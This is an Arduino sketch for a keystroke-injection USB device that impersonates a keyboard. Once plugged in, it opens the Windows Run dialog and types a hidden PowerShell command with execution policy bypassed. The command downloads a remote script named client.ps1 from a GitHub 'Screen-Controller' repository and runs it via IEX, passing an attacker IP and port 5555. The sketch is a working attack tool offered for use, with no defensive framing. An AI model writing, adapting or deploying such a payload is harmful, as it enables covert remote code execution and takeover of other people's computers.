
#include <Keyboard.h>

// ============ CONFIGURATION ============
const char* TARGET_IP = "192.168.8.158";  // ← CHANGE THIS TO YOUR IP!

// GitHub repository 
const char* GITHUB_URL = "https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1";

void setup() {
  Keyboard.begin();
  delay(2000);
  executePayload();
  Keyboard.end();
}

void loop() {
}

void executePayload() {
  // Open Run dialog (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(400);
  
  // Type PowerShell command (downloads from GitHub, passes IP)
  Keyboard.print("powershell -W Hidden -NoP -Exec Bypass -C \"$c='");
  Keyboard.print(TARGET_IP);
  Keyboard.print("';$p=5555;IEX(New-Object Net.WebClient).DownloadString('");
  Keyboard.print(GITHUB_URL);
  Keyboard.print("')\"");
  
  // Press Enter to execute
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}
